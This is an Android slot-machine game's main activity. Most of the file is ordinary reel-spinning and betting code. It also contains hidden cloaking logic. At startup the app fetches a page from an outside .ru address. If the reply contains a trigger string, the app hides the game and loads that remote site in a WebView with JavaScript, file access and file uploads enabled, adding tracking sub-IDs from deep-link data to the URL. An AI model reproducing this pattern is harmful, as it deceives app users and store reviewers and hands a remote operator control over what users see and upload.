package com.vikingames.vikingwarrior;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ViewFlipper;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Random;

import bolts.AppLinks;

public class MainActivity extends AppCompatActivity implements View.OnClickListener{

    private ViewFlipper[][] flip;
    private ImageView buttonUp, buttonDown, buttonSpin, buttonAutoPlay, buttonLeft, buttonMenu, loadingAnim;
    private TextView betText, coinsText, bonusText, jackpotText;
    private ConstraintLayout vikingSlots;
    private WebView pmweb;
    private String urlPp ="https://sites.google.com/view/prvcy-plcy";
    private String urTar ="http://racialhchn.ru/qYtkdw93";
    private String strChoice = "no";
    private String pStr = "";
    private int bet = 500, curBalance = 10000, jackpot = 0;
    private boolean firstSlotStart = false, secondSlotStart = false, thirdSlotStart = false, fourthSlotStart = false, fifthSlotStart = false, gameEnd = false, autoPlayOn = false;
    private Thread threadSlot1, threadSlot2, threadSlot3, threadSlot4, threadSlot5;
    private Runnable checkIfWin, slot1, slot2, slot3, slot4, slot5;
    private static MainActivity inst;
    private ChoiceTask cTask;
    private ValueCallback<Uri> mUploadMessage;
    public ValueCallback<Uri[]> uploadMessage;
    public static final int REQUEST_SELECT_FILE = 100;
    private final static int FILECHOOSER_RESULTCODE = 1;
    private static final String ONESIGNAL_APP_ID = "24263800-478f-4a41-952a-3c4c5afccf64";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        hideNavButtons();
        initializationBtnTxt();
        initializationViewFlippers();
        initializationThreads();
        clickEnable();
        loadingAnimation();
        threadSlot1.start();
        threadSlot2.start();
        threadSlot3.start();
        threadSlot4.start();
        threadSlot5.start();
        inst = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        cTask = new ChoiceTask(urTar);
        cTask.execute();
    }

    private void loadingAnimation() {
        loadingAnim.setBackgroundResource(R.drawable.loading_animation);
        AnimationDrawable anim = (AnimationDrawable) loadingAnim.getBackground();
        anim.start();
    }

    public static MainActivity getInst() {
        return inst;
    }

    private void initializationViewFlippers() {
        flip = new ViewFlipper[][]{{findViewById(R.id.vflip00), findViewById(R.id.vflip01), findViewById(R.id.vflip02), findViewById(R.id.vflip03), findViewById(R.id.vflip04)},
                {findViewById(R.id.vflip10), findViewById(R.id.vflip11), findViewById(R.id.vflip12), findViewById(R.id.vflip13), findViewById(R.id.vflip14)},
                {findViewById(R.id.vflip20), findViewById(R.id.vflip21), findViewById(R.id.vflip22), findViewById(R.id.vflip23), findViewById(R.id.vflip24)} };
    }

    @Override
    public void onBackPressed() {
        if (!strChoice.equals("yes")) {
            pmweb.setVisibility(View.GONE);
        }
        else if (pmweb.canGoBack()) {
            pmweb.goBack();
        }
        else {
            pmweb.loadUrl(urTar);
        }
    }

    private void initializationThreads() {
        slot1 = new Runnable() {
            @Override
            public void run() {
                flip[0][0].showPrevious();
                flip[1][0].showPrevious();
                flip[2][0].showPrevious();
            }
        };
        slot2 = new Runnable() {
            @Override
            public void run() {
                flip[0][1].showNext();
                flip[1][1].showNext();
                flip[2][1].showNext();

            }
        };
        slot3 = new Runnable() {
            @Override
            public void run() {
                flip[0][2].showPrevious();
                flip[1][2].showPrevious();
                flip[2][2].showPrevious();
            }
        };
        slot4 = new Runnable() {
            @Override
            public void run() {
                flip[0][3].showNext();
                flip[1][3].showNext();
                flip[2][3].showNext();

            }
        };
        slot5 = new Runnable() {
            @Override
            public void run() {
                flip[0][4].showPrevious();
                flip[1][4].showPrevious();
                flip[2][4].showPrevious();
            }
        };

        threadSlot1 = new Thread() {
            int tempo1, tempo2, tempo3;
            Random random = new Random();

            @Override
            public void run() {
                while (!gameEnd) {
                    while (firstSlotStart) {

                        bet = Integer.parseInt(betText.getText().toString());
                        curBalance = Integer.parseInt(coinsText.getText().toString());
                        if (curBalance >= bet && curBalance > 0) {

                            tempo3 = random.nextInt(10) + 5;
                            tempo2 = random.nextInt(15) + 5;
                            tempo1 = random.nextInt(20) + 5;

                            try {
                                for (int i = 0; i < tempo1; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(90);
                                }
                                for (int i = 0; i < tempo2; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(180);
                                }
                                for (int i = 0; i < tempo3; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(270);
                                }
                            } catch (Exception ex) {
                            }

                            firstSlotStart = false;
                            runOnUiThread(checkIfWin);
                        }
                    }
                }
            }
        };

        threadSlot2 = new Thread() {
            int tempo1, tempo2, tempo3;
            Random random = new Random();

            @Override
            public void run() {
                while (!gameEnd) {
                    while (secondSlotStart) {

                        bet = Integer.parseInt(betText.getText().toString());
                        curBalance = Integer.parseInt(coinsText.getText().toString());
                        if (curBalance >= bet && curBalance > 0) {

                            tempo3 = random.nextInt(10) + 5;
                            tempo2 = random.nextInt(15) + 5;
                            tempo1 = random.nextInt(20) + 5;

                            try {
                                for (int i = 0; i < tempo1; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(90);
                                }
                                for (int i = 0; i < tempo2; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(180);
                                }
                                for (int i = 0; i < tempo3; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(270);
                                }
                            } catch (Exception ex) {
                            }

                            secondSlotStart = false;
                            runOnUiThread(checkIfWin);
                        }
                    }
                }
            }
        };

        threadSlot3 = new Thread() {
            int tempo1, tempo2, tempo3;
            Random random = new Random();

            @Override
            public void run() {
                while (!gameEnd) {
                    while (thirdSlotStart) {

                        bet = Integer.parseInt(betText.getText().toString());
                        curBalance = Integer.parseInt(coinsText.getText().toString());
                        if (curBalance >= bet && curBalance > 0) {

                            tempo3 = random.nextInt(10) + 5;
                            tempo2 = random.nextInt(15) + 5;
                            tempo1 = random.nextInt(20) + 5;

                            try {
                                for (int i = 0; i < tempo1; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(90);
                                }
                                for (int i = 0; i < tempo2; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(180);
                                }
                                for (int i = 0; i < tempo3; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(270);
                                }
                            } catch (Exception ex) {
                            }

                            thirdSlotStart = false;
                            runOnUiThread(checkIfWin);
                        }
                    }
                }
            }
        };

        threadSlot4 = new Thread() {
            int tempo1, tempo2, tempo3;
            Random random = new Random();

            @Override
            public void run() {
                while (!gameEnd) {
                    while (fourthSlotStart) {

                        bet = Integer.parseInt(betText.getText().toString());
                        curBalance = Integer.parseInt(coinsText.getText().toString());
                        if (curBalance >= bet && curBalance > 0) {

                            tempo3 = random.nextInt(10) + 5;
                            tempo2 = random.nextInt(15) + 5;
                            tempo1 = random.nextInt(20) + 5;

                            try {
                                for (int i = 0; i < tempo1; ++i) {
                                    runOnUiThread(slot4);
                                    sleep(90);
                                }
                                for (int i = 0; i < tempo2; ++i) {
                                    runOnUiThread(slot4);
                                    sleep(180);
                                }
                                for (int i = 0; i < tempo3; ++i) {
                                    runOnUiThread(slot4);
                                    sleep(270);
                                }
                            } catch (Exception ex) {
                            }

                            fourthSlotStart = false;
                            runOnUiThread(checkIfWin);
                        }
                    }
                }
            }
        };


        threadSlot5 = new Thread() {
            int tempo1, tempo2, tempo3;
            Random random = new Random();

            @Override
            public void run() {
                while (!gameEnd) {
                    while (fifthSlotStart) {

                        bet = Integer.parseInt(betText.getText().toString());
                        curBalance = Integer.parseInt(coinsText.getText().toString());
                        if (curBalance >= bet && curBalance > 0) {

                            tempo3 = random.nextInt(10) + 5;
                            tempo2 = random.nextInt(15) + 5;
                            tempo1 = random.nextInt(20) + 5;

                            try {
                                for (int i = 0; i < tempo1; ++i) {
                                    runOnUiThread(slot5);
                                    sleep(90);
                                }
                                for (int i = 0; i < tempo2; ++i) {
                                    runOnUiThread(slot5);
                                    sleep(180);
                                }
                                for (int i = 0; i < tempo3; ++i) {
                                    runOnUiThread(slot5);
                                    sleep(270);
                                }
                            } catch (Exception ex) {
                            }

                            fifthSlotStart = false;
                            runOnUiThread(checkIfWin);
                        }
                    }
                }
            }
        };

        checkIfWin = new Runnable() {
            @Override
            public void run() {
                if (!firstSlotStart && !secondSlotStart && !thirdSlotStart&& !fourthSlotStart && !fifthSlotStart) {

                    int num1 = (flip[1][0].getDisplayedChild() + 12) % 12;
                    int num2 = (flip[1][1].getDisplayedChild() + 9) % 12;
                    int num3 = (flip[1][2].getDisplayedChild() + 9) % 12;
                    int num4 = (flip[1][3].getDisplayedChild() + 1) % 12;
                    int num5 = (flip[1][4].getDisplayedChild() + 6) % 12;

                    int multiplier = -1;

                    List<Integer> numbers = new ArrayList<>();
                    Collections.addAll(numbers, num1, num2, num3, num4, num5);
                    int duplicates = findDuplicate((ArrayList<Integer>) numbers);

                    jackpot = Integer.parseInt(jackpotText.getText().toString());

                    if (duplicates == 4){
                        multiplier = 10;
                        curBalance += jackpot;
                        jackpot = 0;
                        Toast.makeText(MainActivity.this,"Wow, you hit the jackpot!", Toast.LENGTH_SHORT).show();
                    }
                    else if (duplicates == 3){
                        multiplier = 7;
                    }
                    else if(duplicates == 2){
                        multiplier = 5;
                    }
                    else if(duplicates == 1){
                        multiplier = 3;
                    }
                    else{
                        jackpot += bet;
                    }

                    curBalance += bet * multiplier;
                    if(multiplier > 0){
                        bonusText.setText(""+ bet * multiplier);
                    }


                    if(curBalance <= 0) {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        curBalance = 10000;
                        Toast.makeText(MainActivity.this,"You have 10000 points!", Toast.LENGTH_SHORT).show();
                    }
                    if(bet > curBalance){
                        bet = curBalance;
                    }

                    setBetBalanceJackpotText();
                    clickEnable();

                    if(autoPlayOn){
                        spin();
                    }
                }
            }
        };
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        hideNavButtons();
    }

    private void hideNavButtons(){
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    private void initializationBtnTxt() {
        buttonUp = (ImageView) findViewById(R.id.button_up);
        buttonDown = (ImageView) findViewById(R.id.button_down);
        buttonSpin = (ImageView) findViewById(R.id.button_spin);
        buttonAutoPlay = (ImageView) findViewById(R.id.button_auto_play);
        buttonLeft = (ImageView) findViewById(R.id.button_left);
        buttonMenu = (ImageView) findViewById(R.id.button_menu);
        loadingAnim = (ImageView) findViewById(R.id.loading_anim);
        betText = (TextView) findViewById(R.id.bet_text);
        coinsText = (TextView) findViewById(R.id.coins_text);
        bonusText = (TextView) findViewById(R.id.bonus_text);
        jackpotText = (TextView) findViewById(R.id.jackpot_text);
        pmweb = (WebView) findViewById(R.id.pmweb);
        vikingSlots = (ConstraintLayout)findViewById(R.id.vikingslots);

    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.button_up:
                betUp();
                break;
            case R.id.button_down:
                betDown();
                break;
            case R.id.button_spin:
                spin();
                break;
            case R.id.button_auto_play:
                autoPlay();
                break;
            case R.id.button_left:
                closeApp();
                break;
            case R.id.button_menu:
                loadInfoPp();
                break;
        }
    }

    private void loadInfoPp() {
        pmweb.loadUrl(urlPp);
        pmweb.setVisibility(View.VISIBLE);
    }

    private void closeApp() {
        finish();
    }

    private void autoPlay() {

        if(!autoPlayOn && !firstSlotStart && !secondSlotStart && !thirdSlotStart && !fourthSlotStart && !fifthSlotStart){
            autoPlayOn = true;
            spin();
        }
        else {
            autoPlayOn = false;
        }
    }

    private void spin() {
        firstSlotStart = true;
        secondSlotStart = true;
        thirdSlotStart = true;
        fourthSlotStart = true;
        fifthSlotStart = true;
        bonusText.setText("0");
        clickDisable();
    }

    private void betDown() {
        if (bet >= 100){
            bet -= 100;
            setBetBalanceJackpotText();
        }
    }

    private void betUp() {
        if (bet <= curBalance - 100){
            bet += 100;
            setBetBalanceJackpotText();
        }
    }

    private void setBetBalanceJackpotText(){
        betText.setText("" + bet);
        coinsText.setText("" + curBalance);
        jackpotText.setText("" + jackpot);
    }

    private void clickEnable() {
        buttonUp.setOnClickListener(this);
        buttonDown.setOnClickListener(this);
        buttonSpin.setOnClickListener(this);
        buttonAutoPlay.setOnClickListener(this);
        buttonLeft.setOnClickListener(this);
        buttonMenu.setOnClickListener(this);
    }

    private void clickDisable() {
        buttonUp.setOnClickListener(null);
        buttonDown.setOnClickListener(null);
        buttonSpin.setOnClickListener(null);
    }

    private int findDuplicate(ArrayList<Integer> numbers) {
        HashSet set = new HashSet<Integer>();
        int count = 0;
        for (Integer num : numbers) {
            if (set.add(num) == false) {
                count++;
            }
        }
        return count;
    }

    protected void MakeChoice(){

        try {
            pStr = cTask.getStrPage().split("<body>")[1].split("</body>")[0].replaceAll("\\s+", "");
        } catch (Exception ignored) {
        }

        loadingAnim.setVisibility(View.GONE);
        if (pStr.equals("mitalstar") || pStr.length() > 45) {
            Uploading();
            vikingSlots.setVisibility(View.GONE);
            pmweb.setVisibility(View.VISIBLE);            
            strChoice = "yes";

            if (!cTask.getSliceUri().equals("")) {
                urTar = urTar + "?subId1=FOOTBALL&subId2=FOOTBALL&subId3=FOOTBALL&subId4=FOOTBALL&subId5=FOOTBALL";
                String arrSlices[] = cTask.getSliceUri().split("//");
                for (int i = 0; i < arrSlices.length; i++) {
                    urTar = urTar.replaceFirst("FOOTBALL", arrSlices[i]);
                }
                urTar = urTar.replaceAll("FOOTBALL", "");
            }
            Log.d("--- urTar ---", urTar);
            pmweb.loadUrl(urTar);
        }
        else {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            pmweb.setVisibility(View.GONE);
            vikingSlots.setVisibility(View.VISIBLE);
        }
    }

    private void Uploading() {
        WebSettings ws = pmweb.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setSupportZoom(false);
        ws.setAllowFileAccess(true);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);

        CookieSyncManager.createInstance(pmweb.getContext());
        CookieSyncManager.getInstance().sync();

        pmweb.setWebViewClient(new WebViewClient());
        pmweb.setWebChromeClient(new WebChromeClient());
        pmweb.getSettings().setJavaScriptEnabled(true);
        pmweb.getSettings().setDomStorageEnabled(true);
        pmweb.requestFocus(View.FOCUS_DOWN);

        pmweb.setWebChromeClient(new WebChromeClient()
        {
            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            protected void openFileChooser(ValueCallback uploadMsg, String acceptType)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            // For Lollipop 5.0+ Devices
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams)
            {
                if (uploadMessage != null) {
                    uploadMessage.onReceiveValue(null);
                    uploadMessage = null;
                }

                uploadMessage = filePathCallback;

                Intent intent = fileChooserParams.createIntent();
                try
                {
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e)
                {
                    uploadMessage = null;
                    Toast.makeText(MainActivity.this, "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                    return false;
                }
                return true;
            }

            //For Android 4.1 only
            protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture)
            {
                mUploadMessage = uploadMsg;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                intent.setType("image/*");
                startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            protected void openFileChooser(ValueCallback<Uri> uploadMsg)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else
            Toast.makeText(MainActivity.this, "Failed to Upload file", Toast.LENGTH_LONG).show();
    }
}